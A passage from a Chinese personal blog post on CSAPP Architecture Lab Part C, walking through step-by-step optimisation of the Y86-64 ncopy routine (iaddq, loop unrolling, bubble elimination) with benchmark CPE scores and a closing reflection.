Npos:</span><br><span class="line">	irmovq $1, %r10</span><br><span class="line">	addq %r10, %rax		# count++</span><br><span class="line">Npos:	irmovq $1, %r10</span><br><span class="line">	subq %r10, %rdx		# len--</span><br><span class="line">	irmovq $8, %r10</span><br><span class="line">	addq %r10, %rdi		# src++</span><br><span class="line">	addq %r10, %rsi		# dst++</span><br><span class="line">	andq %rdx,%rdx		# len &gt; 0?</span><br><span class="line">	jg Loop			# if so, goto Loop:</span><br></pre></td></tr></table></figure>

<p>先分别执行以下命令，对原始代码测试一波 CPE</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./correctness.pl</span><br><span class="line">./benchmark.pl</span><br></pre></td></tr></table></figure>

<p>得</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Average CPE     <span class="number">15.18</span></span><br><span class="line">Score   <span class="number">0.0</span>/<span class="number">60.0</span></span><br></pre></td></tr></table></figure>

<h2 id="利用iaddq"><a href="#利用iaddq" class="headerlink" title="利用iaddq"></a><strong>利用<code>iaddq</code></strong></h2><p>首先能够直观看到，为了<code>len--/src++/dst++</code>等操作，对<code>%rdi</code>进行了不少次赋值操作，这些都可以用我们新增的<code>iaddq</code>指令替代。</p>
<p>替代后代码为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax		<span class="meta"># count = 0;</span></span><br><span class="line">	andq %rdx,%rdx		<span class="meta"># len &lt;= 0?</span></span><br><span class="line">	jle Done		<span class="meta"># <span class="keyword">if</span> so, goto Done:</span></span><br><span class="line"></span><br><span class="line">Loop:	</span><br><span class="line">	mrmovq (%rdi), %r10	<span class="meta"># read val from src...</span></span><br><span class="line">	rmmovq %r10, (%rsi)	# ...and store it to dst</span><br><span class="line">	andq %r10, %r10		<span class="meta"># val &lt;= 0?</span></span><br><span class="line">	jle Npos		<span class="meta"># <span class="keyword">if</span> so, goto Npos:</span></span><br><span class="line">	iaddq $<span class="number">1</span>, %rax		<span class="meta"># count++</span></span><br><span class="line">Npos:	</span><br><span class="line">	iaddq $<span class="number">-1</span>, %rdx		<span class="meta"># len--</span></span><br><span class="line">	iaddq $<span class="number">8</span>, %rdi		<span class="meta"># src++</span></span><br><span class="line">	iaddq $<span class="number">8</span>, %rsi		<span class="meta"># dst++</span></span><br><span class="line">	andq %rdx,%rdx		<span class="meta"># len &gt; 0?</span></span><br><span class="line">	jg Loop			<span class="meta"># <span class="keyword">if</span> so, goto Loop:</span></span><br></pre></td></tr></table></figure>

<p>测试 CPE</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Average CPE     <span class="number">12.70</span></span><br><span class="line">Score   <span class="number">0.0</span>/<span class="number">60.0</span></span><br></pre></td></tr></table></figure>

<p>虽然分数还是0，但已经有了不少提升</p>
<h2 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h2><p>根据文档的提示，可以试试循环展开进行优化。 循环展开通过增加每次迭代计算的元素的数量，减少循环的迭代次数。这样做对效率提升有什么作用呢？</p>
<ul>
<li>减少了索引计算的次数</li>
<li>减少了条件分支的判断次数</li>
</ul>
<p>那么展开几路效率最高呢？我从5路展开开始分别进行了测试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>路：</span><br><span class="line">    Average CPE     <span class="number">9.61</span></span><br><span class="line">	Score   <span class="number">17.8</span>/<span class="number">60.0</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>路：</span><br><span class="line">    Average CPE     <span class="number">9.58</span></span><br><span class="line">	Score   <span class="number">18.3</span>/<span class="number">60.0</span></span><br><span class="line">    </span><br><span class="line"><span class="number">7</span>路：</span><br><span class="line">    Average CPE     <span class="number">9.59</span></span><br><span class="line">	Score   <span class="number">18.2</span>/<span class="number">60.0</span></span><br><span class="line">    </span><br><span class="line"><span class="number">8</span>路：</span><br><span class="line">    Average CPE     <span class="number">9.62</span></span><br><span class="line">	Score   <span class="number">17.5</span>/<span class="number">60.0</span></span><br></pre></td></tr></table></figure>

<p>所以，我选择进行6路展开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">	# Loop header</span><br><span class="line">	andq %rdx,%rdx		# len &lt;= 0?</span><br><span class="line">	jmp test</span><br><span class="line">Loop:</span><br><span class="line">	mrmovq (%rdi),%r8</span><br><span class="line">	rmmovq %r8,(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Loop1</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">Loop1:</span><br><span class="line">	mrmovq 8(%rdi),%r8</span><br><span class="line">	rmmovq %r8,8(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Loop2</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">Loop2:</span><br><span class="line">	mrmovq 16(%rdi),%r8</span><br><span class="line">	rmmovq %r8,16(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Loop3</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">Loop3:</span><br><span class="line">	mrmovq 24(%rdi),%r8</span><br><span class="line">	rmmovq %r8,24(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Loop4</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">Loop4:</span><br><span class="line">	mrmovq 32(%rdi),%r8</span><br><span class="line">	rmmovq %r8,32(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Loop5</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">Loop5:</span><br><span class="line">	mrmovq 40(%rdi),%r8</span><br><span class="line">	rmmovq %r8,40(%rsi)</span><br><span class="line">	iaddq $48,%rdi</span><br><span class="line">	iaddq $48,%rsi</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle test</span><br><span class="line">	iaddq $1,%rax	</span><br><span class="line">test:</span><br><span class="line">	iaddq $-6, %rdx			# 先减，判断够不够6个</span><br><span class="line">	jge Loop				# 6路展开</span><br><span class="line">	iaddq $-8,%rdi</span><br><span class="line">	iaddq $-8,%rsi</span><br><span class="line">	iaddq $6, %rdx</span><br><span class="line">	jmp test2				#剩下的</span><br><span class="line">Lore:</span><br><span class="line">	mrmovq (%rdi),%r8</span><br><span class="line">	rmmovq %r8,(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle test2</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">test2:</span><br><span class="line">	iaddq $8,%rdi</span><br><span class="line">	iaddq $8,%rsi</span><br><span class="line">	iaddq $-1, %rdx</span><br><span class="line">	jge Lore</span><br></pre></td></tr></table></figure>

<p>代码逻辑非常简单：每次循环都对6个数进行复制，每次复制就设置一个条件语句判断返回时是否加1，对于剩下的数据每次循环只对1个数进行复制。</p>
<p>为了方便分析，我把极端的几个例子的情况列下来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">        ncopy</span><br><span class="line"><span class="number">0</span>       <span class="number">26</span></span><br><span class="line"><span class="number">1</span>       <span class="number">35</span>      <span class="number">35.00</span></span><br><span class="line"><span class="number">2</span>       <span class="number">47</span>      <span class="number">23.50</span></span><br><span class="line"><span class="number">3</span>       <span class="number">56</span>      <span class="number">18.67</span></span><br><span class="line"><span class="number">4</span>       <span class="number">68</span>      <span class="number">17.00</span></span><br><span class="line"><span class="number">5</span>       <span class="number">77</span>      <span class="number">15.40</span></span><br><span class="line"><span class="number">6</span>       <span class="number">69</span>      <span class="number">11.50</span></span><br><span class="line"><span class="number">7</span>       <span class="number">78</span>      <span class="number">11.14</span></span><br><span class="line"><span class="number">8</span>       <span class="number">90</span>      <span class="number">11.25</span></span><br><span class="line"><span class="number">9</span>       <span class="number">99</span>      <span class="number">11.00</span></span><br><span class="line"><span class="number">10</span>      <span class="number">111</span>     <span class="number">11.10</span></span><br><span class="line"><span class="number">11</span>      <span class="number">120</span>     <span class="number">10.91</span></span><br><span class="line"><span class="number">12</span>      <span class="number">112</span>     <span class="number">9.33</span></span><br><span class="line"><span class="number">13</span>      <span class="number">121</span>     <span class="number">9.31</span></span><br><span class="line"><span class="number">14</span>      <span class="number">133</span>     <span class="number">9.50</span></span><br><span class="line"><span class="number">15</span>      <span class="number">142</span>     <span class="number">9.47</span></span><br><span class="line"><span class="number">16</span>      <span class="number">154</span>     <span class="number">9.62</span></span><br><span class="line"><span class="number">17</span>      <span class="number">163</span>     <span class="number">9.59</span></span><br><span class="line"><span class="number">18</span>      <span class="number">155</span>     <span class="number">8.61</span></span><br><span class="line">...</span><br><span class="line"><span class="number">50</span>      <span class="number">391</span>     <span class="number">7.82</span></span><br><span class="line"><span class="number">51</span>      <span class="number">400</span>     <span class="number">7.84</span></span><br><span class="line"><span class="number">52</span>      <span class="number">412</span>     <span class="number">7.92</span></span><br><span class="line"><span class="number">53</span>      <span class="number">421</span>     <span class="number">7.94</span></span><br><span class="line"><span class="number">54</span>      <span class="number">413</span>     <span class="number">7.65</span></span><br><span class="line"><span class="number">55</span>      <span class="number">422</span>     <span class="number">7.67</span></span><br><span class="line"><span class="number">56</span>      <span class="number">434</span>     <span class="number">7.75</span></span><br><span class="line"><span class="number">57</span>      <span class="number">443</span>     <span class="number">7.77</span></span><br><span class="line"><span class="number">58</span>      <span class="number">455</span>     <span class="number">7.84</span></span><br><span class="line"><span class="number">59</span>      <span class="number">464</span>     <span class="number">7.86</span></span><br><span class="line"><span class="number">60</span>      <span class="number">456</span>     <span class="number">7.60</span></span><br><span class="line"><span class="number">61</span>      <span class="number">465</span>     <span class="number">7.62</span></span><br><span class="line"><span class="number">62</span>      <span class="number">477</span>     <span class="number">7.69</span></span><br><span class="line"><span class="number">63</span>      <span class="number">486</span>     <span class="number">7.71</span></span><br><span class="line"><span class="number">64</span>      <span class="number">498</span>     <span class="number">7.78</span></span><br><span class="line">Average CPE     <span class="number">9.58</span></span><br><span class="line">Score   <span class="number">18.3</span>/<span class="number">60.0</span></span><br></pre></td></tr></table></figure>

<p>观察上表，对于小数据而言， CPE 的值非常大，后续可以考虑对小数据进行优化。我们先优化剩余数据的处理，对他们继续进行循环展开。</p>
<h2 id="剩余数据处理"><a href="#剩余数据处理" class="headerlink" title="剩余数据处理"></a>剩余数据处理</h2><p>对于剩余数据，我选择3路循环展开。前面的6路与上面代码一样，我就不再贴出来了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"># Loop header</span><br><span class="line">	andq %rdx,%rdx		<span class="meta"># len &lt;= 0?</span></span><br><span class="line">	jmp test</span><br><span class="line">Loop:...</span><br><span class="line">Loop1:...</span><br><span class="line">...</span><br><span class="line">Loop4:...</span><br><span class="line">Loop5:...</span><br><span class="line">test:</span><br><span class="line">	iaddq $<span class="number">-6</span>, %rdx			# 先减，判断够不够<span class="number">6</span>个</span><br><span class="line">	jge Loop				# <span class="number">6</span>路展开</span><br><span class="line">	iaddq $<span class="number">6</span>, %rdx</span><br><span class="line">	jmp test2				#剩下的</span><br><span class="line"></span><br><span class="line">L:</span><br><span class="line">	mrmovq (%rdi),%r8</span><br><span class="line">	rmmovq %r8,(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle L1</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">L1:</span><br><span class="line">	mrmovq <span class="number">8</span>(%rdi),%r8</span><br><span class="line">	rmmovq %r8,<span class="number">8</span>(%rsi)</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle L2</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">L2:</span><br><span class="line">	mrmovq <span class="number">16</span>(%rdi),%r8</span><br><span class="line">	rmmovq %r8,<span class="number">16</span>(%rsi)</span><br><span class="line">	iaddq $<span class="number">24</span>,%rdi</span><br><span class="line">	iaddq $<span class="number">24</span>,%rsi</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle test2</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">test2:</span><br><span class="line">	iaddq $<span class="number">-3</span>, %rdx			# 先减，判断够不够<span class="number">3</span>个</span><br><span class="line">	jge L</span><br><span class="line">	iaddq $<span class="number">2</span>, %rdx			# <span class="number">-1</span>则不剩了，直接Done,<span class="number">0</span> 剩一个, <span class="number">1</span>剩<span class="number">2</span>个</span><br><span class="line">    je R0</span><br><span class="line">    jl Done</span><br><span class="line">	<span class="title function_">mrmovq</span> <span class="params">(%rdi)</span>,%r8</span><br><span class="line">	rmmovq %r8,<span class="params">(%rsi)</span></span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle R2</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">R2:</span><br><span class="line">	mrmovq 8<span class="params">(%rdi)</span>,%r8</span><br><span class="line">	rmmovq %r8,8<span class="params">(%rsi)</span></span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Done</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">	jmp Done</span><br><span class="line">R0:</span><br><span class="line">	<span class="title function_">mrmovq</span> <span class="params">(%rdi)</span>,%r8</span><br><span class="line">	rmmovq %r8,<span class="params">(%rsi)</span></span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle Done</span><br><span class="line">	iaddq $1,%rax</span><br></pre></td></tr></table></figure>

<p>注意对于3路展开的特殊处理。看第38、39行，通过直接判断剩余数据的数量减少一次条件判断</p>
<p>CPE 值为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Average CPE     <span class="number">9.07</span></span><br><span class="line">Score   <span class="number">28.5</span>/<span class="number">60.0</span></span><br></pre></td></tr></table></figure>

<p>提升了很多，但是依然连一般的分数都还没拿到…</p>
<h2 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h2><p>注意，程序多次使用了下面的操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">rmmovq %r8, (%rsi)</span><br></pre></td></tr></table></figure>

<p><code>Y86-64</code>处理器的流水线有 F(取指)、D(译码)、E(执行)、M(访存)、W(写回) 五个阶段，D 阶段才读取寄存器，M 阶段才读取对应内存值，</p>
<p>即使使用转发来避免数据冒险，这其中也至少会有一个气泡。像这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">bubble</span><br><span class="line">rmmovq %r8, (%rsi)</span><br></pre></td></tr></table></figure>

<p>一个优化办法是，多取一个寄存器，连续进行两次数据复制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">mrmovq <span class="number">8</span>(%rdi), %r9</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">rmmovq %r9, <span class="number">8</span>(%rsi)</span><br></pre></td></tr></table></figure>

<p>像这样，对<code>%r8</code>和<code>%r9</code>进行读入和读出的操作之间都隔着一条其他指令，就不会有气泡产生了。代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">	# Loop header</span><br><span class="line">	andq %rdx,%rdx		<span class="meta"># len &lt;= 0?</span></span><br><span class="line">	jmp test</span><br><span class="line">Loop:</span><br><span class="line">	mrmovq (%rdi),%r8</span><br><span class="line">	mrmovq <span class="number">8</span>(%rdi),%r9</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	rmmovq %r8,(%rsi)</span><br><span class="line">	rmmovq %r9,<span class="number">8</span>(%rsi)</span><br><span class="line">	jle Loop1</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Loop1:	</span><br><span class="line">	andq %r9,%r9</span><br><span class="line">	jle Loop2</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Loop2:</span><br><span class="line">	mrmovq <span class="number">16</span>(%rdi),%r8</span><br><span class="line">	mrmovq <span class="number">24</span>(%rdi),%r9</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	rmmovq %r8,<span class="number">16</span>(%rsi)</span><br><span class="line">	rmmovq %r9,<span class="number">24</span>(%rsi)</span><br><span class="line">	jle Loop3</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Loop3:	</span><br><span class="line">	andq %r9,%r9</span><br><span class="line">	jle Loop4</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Loop4:</span><br><span class="line">	mrmovq <span class="number">32</span>(%rdi),%r8</span><br><span class="line">	mrmovq <span class="number">40</span>(%rdi),%r9</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	rmmovq %r8,<span class="number">32</span>(%rsi)</span><br><span class="line">	rmmovq %r9,<span class="number">40</span>(%rsi)</span><br><span class="line">	jle Loop5</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">Loop5:</span><br><span class="line">	iaddq $<span class="number">48</span>,%rdi</span><br><span class="line">	iaddq $<span class="number">48</span>,%rsi		</span><br><span class="line">	andq %r9,%r9</span><br><span class="line">	jle test</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">test:</span><br><span class="line">	iaddq $<span class="number">-6</span>, %rdx			# 先减，判断够不够<span class="number">6</span>个</span><br><span class="line">	jge Loop				# <span class="number">6</span>路展开</span><br><span class="line">	iaddq $<span class="number">6</span>, %rdx</span><br><span class="line">	jmp test2				#剩下的</span><br><span class="line"></span><br><span class="line">L:</span><br><span class="line">	mrmovq (%rdi),%r8</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	rmmovq %r8,(%rsi)</span><br><span class="line">	jle L1</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">L1:</span><br><span class="line">	mrmovq <span class="number">8</span>(%rdi),%r8</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	rmmovq %r8,<span class="number">8</span>(%rsi)</span><br><span class="line">	jle L2</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">L2:</span><br><span class="line">	mrmovq <span class="number">16</span>(%rdi),%r8</span><br><span class="line">	iaddq $<span class="number">24</span>,%rdi</span><br><span class="line">	rmmovq %r8,<span class="number">16</span>(%rsi)</span><br><span class="line">	iaddq $<span class="number">24</span>,%rsi</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle test2</span><br><span class="line">	iaddq $<span class="number">1</span>,%rax</span><br><span class="line">test2:</span><br><span class="line">	iaddq $<span class="number">-3</span>, %rdx			# 先减，判断够不够<span class="number">3</span>个</span><br><span class="line">	jge L</span><br><span class="line">	iaddq $<span class="number">2</span>, %rdx			# <span class="number">-1</span>则不剩了，直接Done,<span class="number">0</span> 剩一个, <span class="number">1</span>剩<span class="number">2</span>个</span><br><span class="line">    je R0</span><br><span class="line">    jl Done</span><br><span class="line">	<span class="title function_">mrmovq</span> <span class="params">(%rdi)</span>,%r8</span><br><span class="line">	mrmovq 8<span class="params">(%rdi)</span>,%r9</span><br><span class="line">	rmmovq %r8,<span class="params">(%rsi)</span></span><br><span class="line">	rmmovq %r9,8<span class="params">(%rsi)</span></span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	jle R2</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">R2:</span><br><span class="line">	andq %r9,%r9</span><br><span class="line">	jle Done</span><br><span class="line">	iaddq $1,%rax</span><br><span class="line">	jmp Done</span><br><span class="line">R0:</span><br><span class="line">	<span class="title function_">mrmovq</span> <span class="params">(%rdi)</span>,%r8</span><br><span class="line">	andq %r8,%r8</span><br><span class="line">	rmmovq %r8,<span class="params">(%rsi)</span></span><br><span class="line">	jle Done</span><br><span class="line">	iaddq $1,%rax</span><br></pre></td></tr></table></figure>

<p>注意，只有<code>rmmovq</code>不改变条件寄存器的值，所以我们也可以把<code>andq</code>插进中间来消除气泡。</p>
<p>CPE 值为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Average CPE     <span class="number">8.16</span></span><br><span class="line">Score   <span class="number">46.9</span>/<span class="number">60.0</span></span><br></pre></td></tr></table></figure>

<p>这一步的提升是巨大的！我的分数终于像点样子了！</p>
<h2 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h2><p>这里先留个坑。</p>
<p>暂且截图记录我<strong>目前</strong>为止的最高成就：</p>
<p>运行正确：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220313213326792.png" alt="image-20220313213326792"></p>
<p>分数为：46.8</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220313213349365.png" alt="image-20220313213349365"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>读 CSAPP 第 4 章时，我理解得很不通透，部分内容甚至有些迷糊。而做完了本实验，通过亲自设计指令，亲自模拟流水线的工作过程并思考如何优化，我对处理器体系结构有了更深的感悟，有一种了然于胸的感觉。</li>
<li>CMU 的这两位大神老师 Randal E. Bryant 和 David R. O’Hallaron 简直令我佩服得五体投地。我本以为他们只是从理论层面上将第 4 章的处理器指令，流水线如何设计等等教授给我们。没想到，他们竟然真正设计实现了这样一套完整的<code>Y86-64</code>模拟器、测试工具供我们学习。本实验尤其是 Part C 每优化一次就能立即看到自己的分数，这犹如游戏闯关一般的体验令我着迷。这一切要归功于两位老师细致的设计，希望有生之年能见他们一次！</li>
<li>作为一个完美主义者，我在 Part C 部分却没有拿到满分，这简直是无法忍受的。但是我着实学业繁忙，不能在这个实验耗费太多时间，只能暂且搁置，暑假回来继续干它！</li>
<li>本实验耗时 3 天，约 17 小时</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/03/03/CSAPP-Lab03/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/03/CSAPP-Lab03/" class="post-title-link" itemprop="url">CSAPP-Lab03 Attack Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-03 16:28:24" itemprop="dateCreated datePublished" datetime="2022-03-03T16:28:24+08:00">2022-03-03</time>
            </span>
              <span class="post-meta-item">
